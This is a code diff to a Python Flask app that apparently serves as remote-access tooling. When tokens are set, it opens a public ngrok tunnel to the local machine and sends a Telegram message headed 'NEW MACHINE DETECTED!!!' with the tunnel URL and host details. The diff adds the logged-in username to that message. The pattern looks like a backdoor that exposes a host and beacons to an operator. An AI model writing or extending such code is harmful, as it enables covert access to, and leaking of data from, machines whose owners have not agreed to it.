@@ -11,7 +11,8 @@ from functools import wraps
 import shutil
 import atexit
 from flask_session import Session
-import ngrok
+# import ngrok
+from pyngrok import ngrok
 import requests
 
 
@@ -230,17 +231,25 @@ def get_system_info():
     }
     return system_info
 
+def ngrok_cleanup():
+    print("Stopping Ngrok tunnel...")
+    ngrok.disconnect(listener.public_url)
+    ngrok.kill()
 
-# Register the cleanup function to run at exit
+
+
+# Register the cleanup functions to run at exit
 atexit.register(cleanup)
+atexit.register(ngrok_cleanup)
 
 if __name__ == "__main__":
     try:
         if NGROK_TOKEN:
-            print(f"Fetching remote loopback URL on url: http://{HOST}:{PORT}...")
-            listener = ngrok.connect(PORT, authtoken=NGROK_TOKEN)
-            lurl = listener.url()
-            print (f"Loopback URL established at: {lurl}")
+            print(f"Starting Ngrok tunnel on  http://{HOST}:{PORT}...")
+            ngrok.set_auth_token(NGROK_TOKEN)  # Authenticate
+            listener = ngrok.connect(PORT, "http")  # Establish the tunnel
+            lurl = listener.public_url
+            print(f"Loopback URL established at: {lurl}")
             if TELEGRAM_BOT_TOKEN and TELEGRAM_CHATID:
                 systeminfo = get_system_info()
                 msg = f"""
@@ -248,7 +257,7 @@ NEW MACHINE DETECTED!!!
 LOOPBACK URL {lurl}
 SYSTEM INFO:
 System: {systeminfo['System']}
-Node Name: {systeminfo['Node Name']}
+Node Name: {systeminfo['Node Name']} | ({os.getenv("USERNAME", "")})
 Release: {systeminfo['Release']}
 Version: {systeminfo['Version']}
 Machine: {systeminfo['Machine']}
